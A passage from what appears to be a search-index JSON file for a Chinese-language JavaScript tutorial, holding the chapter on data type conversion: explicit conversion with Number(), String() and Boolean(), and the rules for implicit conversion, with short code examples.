String() \u51fd\u6570\u8fdb\u884c\u8f6c\u6362\u3002\u5982\u679c\u8be5\u4f4d\u7f6e\u65e2\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u80fd\u662f\u6570\u503c\uff0c\u90a3\u4e48\u9ed8\u8ba4\u8f6c\u4e3a\u6570\u503c\u3002 \u7531\u4e8e\u81ea\u52a8\u8f6c\u6362\u5177\u6709\u4e0d\u786e\u5b9a\u6027\uff0c\u800c\u4e14\u4e0d\u6613\u9664\u9519\uff0c\u5efa\u8bae\u5728\u9884\u671f\u4e3a\u5e03\u5c14\u503c\u3001\u6570\u503c\u3001\u5b57\u7b26\u4e32\u7684\u5730\u65b9\uff0c\u5168\u90e8\u4f7f\u7528 Boolean() \u3001 Number() \u548c String() \u51fd\u6570\u8fdb\u884c\u663e\u5f0f\u8f6c\u6362\u3002 \u81ea\u52a8\u8f6c\u6362\u4e3a\u5e03\u5c14\u503c \u00b6 JavaScript \u9047\u5230\u9884\u671f\u4e3a\u5e03\u5c14\u503c\u7684\u5730\u65b9\uff08\u6bd4\u5982 if \u8bed\u53e5\u7684\u6761\u4ef6\u90e8\u5206\uff09\uff0c\u5c31\u4f1a\u5c06\u975e\u5e03\u5c14\u503c\u7684\u53c2\u6570\u81ea\u52a8\u8f6c\u6362\u4e3a\u5e03\u5c14\u503c\u3002\u7cfb\u7edf\u5185\u90e8\u4f1a\u81ea\u52a8\u8c03\u7528 Boolean() \u51fd\u6570\u3002 \u56e0\u6b64\u9664\u4e86\u4ee5\u4e0b\u4e94\u4e2a\u503c\uff0c\u5176\u4ed6\u90fd\u662f\u81ea\u52a8\u8f6c\u4e3a true \u3002 undefined null +0 \u6216 -0 NaN '' \uff08\u7a7a\u5b57\u7b26\u4e32\uff09 \u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6761\u4ef6\u90e8\u5206\u7684\u6bcf\u4e2a\u503c\u90fd\u76f8\u5f53\u4e8e false \uff0c\u4f7f\u7528\u5426\u5b9a\u8fd0\u7b97\u7b26\u540e\uff0c\u5c31\u53d8\u6210\u4e86 true \u3002 1 2 3 4 5 6 7 8 if ( ! undefined && ! null && ! 0 && ! NaN && ! '' ) { console . log ( 'true' ); } // true \u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\uff0c\u6709\u65f6\u4e5f\u7528\u4e8e\u5c06\u4e00\u4e2a\u8868\u8fbe\u5f0f\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002\u5b83\u4eec\u5185\u90e8\u8c03\u7528\u7684\u4e5f\u662f Boolean() \u51fd\u6570\u3002 1 2 3 4 5 // \u5199\u6cd5\u4e00 expression ? true : false // \u5199\u6cd5\u4e8c !! expression \u81ea\u52a8\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32 \u00b6 JavaScript \u9047\u5230\u9884\u671f\u4e3a\u5b57\u7b26\u4e32\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u5c06\u975e\u5b57\u7b26\u4e32\u7684\u503c\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002\u5177\u4f53\u89c4\u5219\u662f\uff0c\u5148\u5c06\u590d\u5408\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u518d\u5c06\u539f\u59cb\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32\u7684\u81ea\u52a8\u8f6c\u6362\uff0c\u4e3b\u8981\u53d1\u751f\u5728\u5b57\u7b26\u4e32\u7684\u52a0\u6cd5\u8fd0\u7b97\u65f6\u3002\u5f53\u4e00\u4e2a\u503c\u4e3a\u5b57\u7b26\u4e32\uff0c\u53e6\u4e00\u4e2a\u503c\u4e3a\u975e\u5b57\u7b26\u4e32\uff0c\u5219\u540e\u8005\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 '5' + 1 // '51' '5' + true // \"5true\" '5' + false // \"5false\" '5' + {} // \"5[object Object]\" '5' + [] // \"5\" '5' + function (){} // \"5function (){}\" '5' + undefined // \"5undefined\" '5' + null // \"5null\" \u8fd9\u79cd\u81ea\u52a8\u8f6c\u6362\u5f88\u5bb9\u6613\u51fa\u9519\u3002 1 2 3 4 5 var obj = { width : '100' }; obj . width + 20 // \"10020\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f00\u53d1\u8005\u53ef\u80fd\u671f\u671b\u8fd4\u56de 120 \uff0c\u4f46\u662f\u7531\u4e8e\u81ea\u52a8\u8f6c\u6362\uff0c\u5b9e\u9645\u4e0a\u8fd4\u56de\u4e86\u4e00\u4e2a\u5b57\u7b26 10020 \u3002 \u81ea\u52a8\u8f6c\u6362\u4e3a\u6570\u503c \u00b6 JavaScript \u9047\u5230\u9884\u671f\u4e3a\u6570\u503c\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u5c06\u53c2\u6570\u503c\u81ea\u52a8\u8f6c\u6362\u4e3a\u6570\u503c\u3002\u7cfb\u7edf\u5185\u90e8\u4f1a\u81ea\u52a8\u8c03\u7528 Number() \u51fd\u6570\u3002 \u9664\u4e86\u52a0\u6cd5\u8fd0\u7b97\u7b26\uff08 + \uff09\u6709\u53ef\u80fd\u628a\u8fd0\u7b97\u5b50\u8f6c\u4e3a\u5b57\u7b26\u4e32\uff0c\u5176\u4ed6\u8fd0\u7b97\u7b26\u90fd\u4f1a\u628a\u8fd0\u7b97\u5b50\u81ea\u52a8\u8f6c\u6210\u6570\u503c\u3002 1 2 3 4 5 6 7 8 9 10 '5' - '2' // 3 '5' * '2' // 10 true - 1 // 0 false - 1 // -1 '1' - 1 // 0 '5' * [] // 0 false / '5' // 0 'abc' - 1 // NaN null + 1 // 1 undefined + 1 // NaN \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8fd0\u7b97\u7b26\u4e24\u4fa7\u7684\u8fd0\u7b97\u5b50\uff0c\u90fd\u88ab\u8f6c\u6210\u4e86\u6570\u503c\u3002 \u6ce8\u610f\uff1a null \u8f6c\u4e3a\u6570\u503c\u65f6\u4e3a 0 \uff0c\u800c undefined \u8f6c\u4e3a\u6570\u503c\u65f6\u4e3a NaN \u3002 \u4e00\u5143\u8fd0\u7b97\u7b26\u4e5f\u4f1a\u628a\u8fd0\u7b97\u5b50\u8f6c\u6210\u6570\u503c\u3002 1 2 3 4 + 'abc' // NaN - 'abc' // NaN + true // 1 - false // 0 \u53c2\u8003\u94fe\u63a5 \u00b6 Axel Rauschmayer, What is {} + {} in JavaScript? Axel Rauschmayer, JavaScript quirk 1: implicit conversion of values Benjie Gillam, Quantum JavaScript?","title":"\u6570\u636e\u7c7b\u578b\u7684\u8f6c\u6362"},{"location":"features/conversion/#_1","text":"","title":"\u6570\u636e\u7c7b\u578b\u7684\u8f6c\u6362"},{"location":"features/conversion/#_2","text":"JavaScript \u662f\u4e00\u79cd\u52a8\u6001\u7c7b\u578b\u8bed\u8a00\uff0c\u53d8\u91cf\u6ca1\u6709\u7c7b\u578b\u9650\u5236\uff0c\u53ef\u4ee5\u968f\u65f6\u8d4b\u4e88\u4efb\u610f\u503c\u3002 1 var x = y ? 1 : 'a' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf x \u5230\u5e95\u662f\u6570\u503c\u8fd8\u662f\u5b57\u7b26\u4e32\uff0c\u53d6\u51b3\u4e8e\u53e6\u4e00\u4e2a\u53d8\u91cf y \u7684\u503c\u3002 y \u4e3a true \u65f6\uff0c x \u662f\u4e00\u4e2a\u6570\u503c\uff1b y \u4e3a false \u65f6\uff0c x \u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u8fd9\u610f\u5473\u7740\uff0c x \u7684\u7c7b\u578b\u6ca1\u6cd5\u5728\u7f16\u8bd1\u9636\u6bb5\u5c31\u77e5\u9053\uff0c\u5fc5\u987b\u7b49\u5230\u8fd0\u884c\u65f6\u624d\u80fd\u77e5\u9053\u3002 \u867d\u7136\u53d8\u91cf\u7684\u6570\u636e\u7c7b\u578b\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u4f46\u662f\u5404\u79cd\u8fd0\u7b97\u7b26\u5bf9\u6570\u636e\u7c7b\u578b\u662f\u6709\u8981\u6c42\u7684\u3002\u5982\u679c\u8fd0\u7b97\u7b26\u53d1\u73b0\uff0c\u8fd0\u7b97\u5b50\u7684\u7c7b\u578b\u4e0e\u9884\u671f\u4e0d\u7b26\uff0c\u5c31\u4f1a\u81ea\u52a8\u8f6c\u6362\u7c7b\u578b\u3002\u6bd4\u5982\uff0c\u51cf\u6cd5\u8fd0\u7b97\u7b26\u9884\u671f\u5de6\u53f3\u4e24\u4fa7\u7684\u8fd0\u7b97\u5b50\u5e94\u8be5\u662f\u6570\u503c\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5c31\u4f1a\u81ea\u52a8\u5c06\u5b83\u4eec\u8f6c\u4e3a\u6570\u503c\u3002 1 '4' - '3' // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u867d\u7136\u662f\u4e24\u4e2a\u5b57\u7b26\u4e32\u76f8\u51cf\uff0c\u4f46\u662f\u4f9d\u7136\u4f1a\u5f97\u5230\u7ed3\u679c\u6570\u503c 1 \uff0c\u539f\u56e0\u5c31\u5728\u4e8e JavaScript \u5c06\u8fd0\u7b97\u5b50\u81ea\u52a8\u8f6c\u4e3a\u4e86\u6570\u503c\u3002 \u672c\u7ae0\u8bb2\u89e3\u6570\u636e\u7c7b\u578b\u81ea\u52a8\u8f6c\u6362\u7684\u89c4\u5219\u3002\u5728\u6b64\u4e4b\u524d\uff0c\u5148\u8bb2\u89e3\u5982\u4f55\u624b\u52a8\u5f3a\u5236\u8f6c\u6362\u6570\u636e\u7c7b\u578b\u3002","title":"\u6982\u8ff0"},{"location":"features/conversion/#_3","text":"\u5f3a\u5236\u8f6c\u6362\u4e3b\u8981\u6307\u4f7f\u7528 Number() \u3001 String() \u548c Boolean() \u4e09\u4e2a\u51fd\u6570\uff0c\u624b\u52a8\u5c06\u5404\u79cd\u7c7b\u578b\u7684\u503c\uff0c\u5206\u522b\u8f6c\u6362\u6210\u6570\u5b57\u3001\u5b57\u7b26\u4e32\u6216\u8005\u5e03\u5c14\u503c\u3002","title":"\u5f3a\u5236\u8f6c\u6362"},{"location":"features/conversion/#number","text":"\u4f7f\u7528 Number \u51fd\u6570\uff0c\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\u8f6c\u5316\u6210\u6570\u503c\u3002 \u4e0b\u9762\u5206\u6210\u4e24\u79cd\u60c5\u51b5\u8ba8\u8bba\uff0c\u4e00\u79cd\u662f\u53c2\u6570\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u53e6\u4e00\u79cd\u662f\u53c2\u6570\u662f\u5bf9\u8c61\u3002 \uff081\uff09\u539f\u59cb\u7c7b\u578b\u503c \u539f\u59cb\u7c7b\u578b\u503c\u7684\u8f6c\u6362\u89c4\u5219\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // \u6570\u503c\uff1a\u8f6c\u6362\u540e\u8fd8\u662f\u539f\u6765\u7684\u503c Number ( 324 ) // 324 // \u5b57\u7b26\u4e32\uff1a\u5982\u679c\u53ef\u4ee5\u88ab\u89e3\u6790\u4e3a\u6570\u503c\uff0c\u5219\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684\u6570\u503c Number ( '324' ) // 324 // \u5b57\u7b26\u4e32\uff1a\u5982\u679c\u4e0d\u53ef\u4ee5\u88ab\u89e3\u6790\u4e3a\u6570\u503c\uff0c\u8fd4\u56de NaN Number ( '324abc' ) // NaN // \u7a7a\u5b57\u7b26\u4e32\u8f6c\u4e3a0 Number ( '' ) // 0 // \u5e03\u5c14\u503c\uff1atrue \u8f6c\u6210 1\uff0cfalse \u8f6c\u6210 0 Number ( true ) // 1 Number ( false ) // 0 // undefined\uff1a\u8f6c\u6210 NaN Number ( undefined ) // NaN // null\uff1a\u8f6c\u62100 Number ( null ) // 0 Number \u51fd\u6570\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u503c\uff0c\u8981\u6bd4 parseInt \u51fd\u6570\u4e25\u683c\u5f88\u591a\u3002\u57fa\u672c\u4e0a\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u5b57\u7b26\u65e0\u6cd5\u8f6c\u6210\u6570\u503c\uff0c\u6574\u4e2a\u5b57\u7b26\u4e32\u5c31\u4f1a\u88ab\u8f6c\u4e3a NaN \u3002 1 2 parseInt ( '42 cats' ) // 42 Number ( '42 cats' ) // NaN \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c parseInt \u9010\u4e2a\u89e3\u6790\u5b57\u7b26\uff0c\u800c Number \u51fd\u6570\u6574\u4f53\u8f6c\u6362\u5b57\u7b26\u4e32\u7684\u7c7b\u578b\u3002 \u53e6\u5916\uff0c parseInt \u548c Number \u51fd\u6570\u90fd\u4f1a\u81ea\u52a8\u8fc7\u6ee4\u4e00\u4e2a\u5b57\u7b26\u4e32\u524d\u5bfc\u548c\u540e\u7f00\u7684\u7a7a\u683c\u3002 1 2 parseInt ( '\\t\\v\\r12.34\\n' ) // 12 Number ( '\\t\\v\\r12.34\\n' ) // 12.34 \uff082\uff09\u5bf9\u8c61 \u7b80\u5355\u7684\u89c4\u5219\u662f\uff0c Number \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5bf9\u8c61\u65f6\uff0c\u5c06\u8fd4\u56de NaN \uff0c\u9664\u975e\u662f\u5305\u542b\u5355\u4e2a\u6570\u503c\u7684\u6570\u7ec4\u3002 1 2 3 Number ({ a : 1 }) // NaN Number ([ 1 , 2 , 3 ]) // NaN Number ([ 5 ]) // 5 \u4e4b\u6240\u4ee5\u4f1a\u8fd9\u6837\uff0c\u662f\u56e0\u4e3a Number \u80cc\u540e\u7684\u8f6c\u6362\u89c4\u5219\u6bd4\u8f83\u590d\u6742\u3002 \u7b2c\u4e00\u6b65\uff0c\u8c03\u7528\u5bf9\u8c61\u81ea\u8eab\u7684 valueOf \u65b9\u6cd5\u3002\u5982\u679c\u8fd4\u56de\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u76f4\u63a5\u5bf9\u8be5\u503c\u4f7f\u7528 Number \u51fd\u6570\uff0c\u4e0d\u518d\u8fdb\u884c\u540e\u7eed\u6b65\u9aa4\u3002 \u7b2c\u4e8c\u6b65\uff0c\u5982\u679c valueOf \u65b9\u6cd5\u8fd4\u56de\u7684\u8fd8\u662f\u5bf9\u8c61\uff0c\u5219\u6539\u4e3a\u8c03\u7528\u5bf9\u8c61\u81ea\u8eab\u7684 toString \u65b9\u6cd5\u3002\u5982\u679c toString \u65b9\u6cd5\u8fd4\u56de\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u5bf9\u8be5\u503c\u4f7f\u7528 Number \u51fd\u6570\uff0c\u4e0d\u518d\u8fdb\u884c\u540e\u7eed\u6b65\u9aa4\u3002 \u7b2c\u4e09\u6b65\uff0c\u5982\u679c toString \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u5bf9\u8c61\uff0c\u5c31\u62a5\u9519\u3002 \u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var obj = { x : 1 }; Number ( obj ) // NaN // \u7b49\u540c\u4e8e if ( typeof obj . valueOf () === 'object' ) { Number ( obj . toString ()); } else { Number ( obj . valueOf ()); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Number \u51fd\u6570\u5c06 obj \u5bf9\u8c61\u8f6c\u4e3a\u6570\u503c\u3002\u80cc\u540e\u53d1\u751f\u4e86\u4e00\u8fde\u4e32\u7684\u64cd\u4f5c\uff0c\u9996\u5148\u8c03\u7528 obj.valueOf \u65b9\u6cd5, \u7ed3\u679c\u8fd4\u56de\u5bf9\u8c61\u672c\u8eab\uff1b\u4e8e\u662f\uff0c\u7ee7\u7eed\u8c03\u7528 obj.toString \u65b9\u6cd5\uff0c\u8fd9\u65f6\u8fd4\u56de\u5b57\u7b26\u4e32 [object Object] \uff0c\u5bf9\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4f7f\u7528 Number \u51fd\u6570\uff0c\u5f97\u5230 NaN \u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u8fd4\u56de\u5bf9\u8c61\u672c\u8eab\uff0c\u6240\u4ee5\u4e00\u822c\u603b\u662f\u4f1a\u8c03\u7528 toString \u65b9\u6cd5\uff0c\u800c toString \u65b9\u6cd5\u8fd4\u56de\u5bf9\u8c61\u7684\u7c7b\u578b\u5b57\u7b26\u4e32\uff08\u6bd4\u5982 [object Object] \uff09\u3002\u6240\u4ee5\uff0c\u4f1a\u6709\u4e0b\u9762\u7684\u7ed3\u679c\u3002 1 Number ({}) // NaN \u5982\u679c toString \u65b9\u6cd5\u8fd4\u56de\u7684\u4e0d\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u7ed3\u679c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = { valueOf : function () { return {}; }, toString : function () { return {}; } }; Number ( obj ) // TypeError: Cannot convert object to primitive value \u4e0a\u9762\u4ee3\u7801\u7684 valueOf \u548c toString \u65b9\u6cd5\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u5bf9\u8c61\uff0c\u6240\u4ee5\u8f6c\u6210\u6570\u503c\u65f6\u4f1a\u62a5\u9519\u3002 \u4ece\u4e0a\u4f8b\u8fd8\u53ef\u4ee5\u770b\u5230\uff0c valueOf \u548c toString \u65b9\u6cd5\uff0c\u90fd\u662f\u53ef\u4ee5\u81ea\u5b9a\u4e49\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Number ({ valueOf : function () { return 2 ; } }) // 2 Number ({ toString : function () { return 3 ; } }) // 3 Number ({ valueOf : function () { return 2 ; }, toString : function () { return 3 ; } }) // 2 \u4e0a\u9762\u4ee3\u7801\u5bf9\u4e09\u4e2a\u5bf9\u8c61\u4f7f\u7528 Number \u51fd\u6570\u3002\u7b2c\u4e00\u4e2a\u5bf9\u8c61\u8fd4\u56de valueOf \u65b9\u6cd5\u7684\u503c\uff0c\u7b2c\u4e8c\u4e2a\u5bf9\u8c61\u8fd4\u56de toString \u65b9\u6cd5\u7684\u503c\uff0c\u7b2c\u4e09\u4e2a\u5bf9\u8c61\u8868\u793a valueOf \u65b9\u6cd5\u5148\u4e8e toString \u65b9\u6cd5\u6267\u884c\u3002","title":"Number()"},{"location":"features/conversion/#string","text":"String \u51fd\u6570\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\uff0c\u8f6c\u6362\u89c4\u5219\u5982\u4e0b\u3002 \uff081\uff09\u539f\u59cb\u7c7b\u578b\u503c \u6570\u503c \uff1a\u8f6c\u4e3a\u76f8\u5e94\u7684\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32 \uff1a\u8f6c\u6362\u540e\u8fd8\u662f\u539f\u6765\u7684\u503c\u3002 \u5e03\u5c14\u503c \uff1a true \u8f6c\u4e3a\u5b57\u7b26\u4e32 \"true\" \uff0c false \u8f6c\u4e3a\u5b57\u7b26\u4e32 \"false\" \u3002 undefined \uff1a\u8f6c\u4e3a\u5b57\u7b26\u4e32 \"undefined\" \u3002 null \uff1a\u8f6c\u4e3a\u5b57\u7b26\u4e32 \"null\" \u3002 1 2 3 4 5 String ( 123 ) // \"123\" String ( 'abc' ) // \"abc\" String ( true ) // \"true\" String ( undefined ) // \"undefined\" String ( null ) // \"null\" \uff082\uff09\u5bf9\u8c61 String \u65b9\u6cd5\u7684\u53c2\u6570\u5982\u679c\u662f\u5bf9\u8c61\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u5b57\u7b26\u4e32\uff1b\u5982\u679c\u662f\u6570\u7ec4\uff0c\u8fd4\u56de\u8be5\u6570\u7ec4\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 String ({ a : 1 }) // \"[object Object]\" String ([ 1 , 2 , 3 ]) // \"1,2,3\" String \u65b9\u6cd5\u80cc\u540e\u7684\u8f6c\u6362\u89c4\u5219\uff0c\u4e0e Number \u65b9\u6cd5\u57fa\u672c\u76f8\u540c\uff0c\u53ea\u662f\u4e92\u6362\u4e86 valueOf \u65b9\u6cd5\u548c toString \u65b9\u6cd5\u7684\u6267\u884c\u987a\u5e8f\u3002 \u5148\u8c03\u7528\u5bf9\u8c61\u81ea\u8eab\u7684 toString \u65b9\u6cd5\u3002\u5982\u679c\u8fd4\u56de\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u5bf9\u8be5\u503c\u4f7f\u7528 String \u51fd\u6570\uff0c\u4e0d\u518d\u8fdb\u884c\u4ee5\u4e0b\u6b65\u9aa4\u3002 \u5982\u679c toString \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u5bf9\u8c61\uff0c\u518d\u8c03\u7528\u539f\u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u3002\u5982\u679c valueOf \u65b9\u6cd5\u8fd4\u56de\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u5bf9\u8be5\u503c\u4f7f\u7528 String \u51fd\u6570\uff0c\u4e0d\u518d\u8fdb\u884c\u4ee5\u4e0b\u6b65\u9aa4\u3002 \u5982\u679c valueOf \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u5bf9\u8c61\uff0c\u5c31\u62a5\u9519\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 String ({ a : 1 }) // \"[object Object]\" // \u7b49\u540c\u4e8e String ({ a : 1 }. toString ()) // \"[object Object]\" \u4e0a\u9762\u4ee3\u7801\u5148\u8c03\u7528\u5bf9\u8c61\u7684 toString \u65b9\u6cd5\uff0c\u53d1\u73b0\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32 [object Object] \uff0c\u5c31\u4e0d\u518d\u8c03\u7528 valueOf \u65b9\u6cd5\u4e86\u3002 \u5982\u679c toString \u6cd5\u548c valueOf \u65b9\u6cd5\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u5bf9\u8c61\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = { valueOf : function () { return {}; }, toString : function () { return {}; } }; String ( obj ) // TypeError: Cannot convert object to primitive value \u4e0b\u9762\u662f\u901a\u8fc7\u81ea\u5b9a\u4e49 toString \u65b9\u6cd5\uff0c\u6539\u53d8\u8fd4\u56de\u503c\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 String ({ toString : function () { return 3 ; } }) // \"3\" String ({ valueOf : function () { return 2 ; } }) // \"[object Object]\" String ({ valueOf : function () { return 2 ; }, toString : function () { return 3 ; } }) // \"3\" \u4e0a\u9762\u4ee3\u7801\u5bf9\u4e09\u4e2a\u5bf9\u8c61\u4f7f\u7528 String \u51fd\u6570\u3002\u7b2c\u4e00\u4e2a\u5bf9\u8c61\u8fd4\u56de toString \u65b9\u6cd5\u7684\u503c\uff08\u6570\u503c3\uff09\uff0c\u7b2c\u4e8c\u4e2a\u5bf9\u8c61\u8fd4\u56de\u7684\u8fd8\u662f toString \u65b9\u6cd5\u7684\u503c\uff08 [object Object] \uff09\uff0c\u7b2c\u4e09\u4e2a\u5bf9\u8c61\u8868\u793a toString \u65b9\u6cd5\u5148\u4e8e valueOf \u65b9\u6cd5\u6267\u884c\u3002","title":"String()"},{"location":"features/conversion/#boolean","text":"Boolean() \u51fd\u6570\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b\u7684\u503c\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002 \u5b83\u7684\u8f6c\u6362\u89c4\u5219\u76f8\u5bf9\u7b80\u5355\uff1a\u9664\u4e86\u4ee5\u4e0b\u4e94\u4e2a\u503c\u7684\u8f6c\u6362\u7ed3\u679c\u4e3a false \uff0c\u5176\u4ed6\u7684\u503c\u5168\u90e8\u4e3a true \u3002 undefined null 0 \uff08\u5305\u542b -0 \u548c +0 \uff09 NaN '' \uff08\u7a7a\u5b57\u7b26\u4e32\uff09 1 2 3 4 5 Boolean ( undefined ) // false Boolean ( null ) // false Boolean ( 0 ) // false Boolean ( NaN ) // false Boolean ( '' ) // false \u5f53\u7136\uff0c true \u548c false \u8fd9\u4e24\u4e2a\u5e03\u5c14\u503c\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\u3002 1 2 Boolean ( true ) // true Boolean ( false ) // false \u6ce8\u610f\uff0c\u6240\u6709\u5bf9\u8c61\uff08\u5305\u62ec\u7a7a\u5bf9\u8c61\uff09\u7684\u8f6c\u6362\u7ed3\u679c\u90fd\u662f true \uff0c\u751a\u81f3\u8fde false \u5bf9\u5e94\u7684\u5e03\u5c14\u5bf9\u8c61 new Boolean(false) \u4e5f\u662f true \uff08\u8be6\u89c1\u300a\u539f\u59cb\u7c7b\u578b\u503c\u7684\u5305\u88c5\u5bf9\u8c61\u300b\u4e00\u7ae0\uff09\u3002 1 2 3 Boolean ({}) // true Boolean ([]) // true Boolean ( new Boolean ( false )) // true \u6240\u6709\u5bf9\u8c61\u7684\u5e03\u5c14\u503c\u90fd\u662f true \uff0c\u8fd9\u662f\u56e0\u4e3a JavaScript \u8bed\u8a00\u8bbe\u8ba1\u7684\u65f6\u5019\uff0c\u51fa\u4e8e\u6027\u80fd\u7684\u8003\u8651\uff0c\u5982\u679c\u5bf9\u8c61\u9700\u8981\u8ba1\u7b97\u624d\u80fd\u5f97\u5230\u5e03\u5c14\u503c\uff0c\u5bf9\u4e8e obj1 && obj2 \u8fd9\u6837\u7684\u573a\u666f\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u8f83\u591a\u7684\u8ba1\u7b97\u3002\u4e3a\u4e86\u4fdd\u8bc1\u6027\u80fd\uff0c\u5c31\u7edf\u4e00\u89c4\u5b9a\uff0c\u5bf9\u8c61\u7684\u5e03\u5c14\u503c\u4e3a true \u3002","title":"Boolean()"},{"location":"features/conversion/#_4","text":"\u4e0b\u9762\u4ecb\u7ecd\u81ea\u52a8\u8f6c\u6362\uff0c\u5b83\u662f\u4ee5\u5f3a\u5236\u8f6c\u6362\u4e3a\u57fa\u7840\u7684\u3002 \u9047\u5230\u4ee5\u4e0b\u4e09\u79cd\u60c5\u51b5\u65f6\uff0cJavaScript \u4f1a\u81ea\u52a8\u8f6c\u6362\u6570\u636e\u7c7b\u578b\uff0c\u5373\u8f6c\u6362\u662f\u81ea\u52a8\u5b8c\u6210\u7684\uff0c\u7528\u6237\u4e0d\u53ef\u89c1\u3002 \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u4e92\u76f8\u8fd0\u7b97\u3002 1 123 + 'abc' // \"123abc\" \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u5bf9\u975e\u5e03\u5c14\u503c\u7c7b\u578b\u7684\u6570\u636e\u6c42\u5e03\u5c14\u503c\u3002 1 2 3 if ( 'abc' ) { console . log ( 'hello' ) } // \"hello\" \u7b2c\u4e09\u79cd\u60c5\u51b5\uff0c\u5bf9\u975e\u6570\u503c\u7c7b\u578b\u7684\u503c\u4f7f\u7528\u4e00\u5143\u8fd0\u7b97\u7b26\uff08\u5373 + \u548c - \uff09\u3002 1 2 + { foo : 'bar' } // NaN - [ 1 , 2 , 3 ] // NaN \u81ea\u52a8\u8f6c\u6362\u7684\u89c4\u5219\u662f\u8fd9\u6837\u7684\uff1a\u9884\u671f\u4ec0\u4e48\u7c7b\u578b\u7684\u503c\uff0c\u5c31\u8c03\u7528\u8be5\u7c7b\u578b\u7684\u8f6c\u6362\u51fd\u6570\u3002\u6bd4\u5982\uff0c\u67d0\u4e2a\u4f4d\u7f6e\u9884\u671f\u4e3a\u5b57\u7b26\u4e32\uff0c\u5c31\u8c03\u7528 String() \u51fd\u6570\u8fdb\u884c\u8f6c\u6362\u3002\u5982\u679c\u8be5\u4f4d\u7f6e\u65e2\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u80fd\u662f\u6570\u503c\uff0c\u90a3\u4e48\u9ed8\u8ba4\u8f6c\u4e3a\u6570\u503c\u3002 \u7531\u4e8e\u81ea\u52a8\u8f6c\u6362\u5177\u6709\u4e0d\u786e\u5b9a\u6027\uff0c\u800c\u4e14\u4e0d\u6613\u9664\u9519\uff0c\u5efa\u8bae\u5728\u9884\u671f\u4e3a\u5e03\u5c14\u503c\u3001\u6570\u503c\u3001\u5b57\u7b26\u4e32\u7684\u5730\u65b9\uff0c\u5168\u90e8\u4f7f\u7528 Boolean() \u3001 Number() \u548c String() \u51fd\u6570\u8fdb\u884c\u663e\u5f0f\u8f6c\u6362\u3002","title":"\u81ea\u52a8\u8f6c\u6362"},{"location":"features/conversion/#_5","text":"JavaScript \u9047\u5230\u9884\u671f\u4e3a\u5e03\u5c14\u503c\u7684\u5730\u65b9\uff08\u6bd4\u5982 if 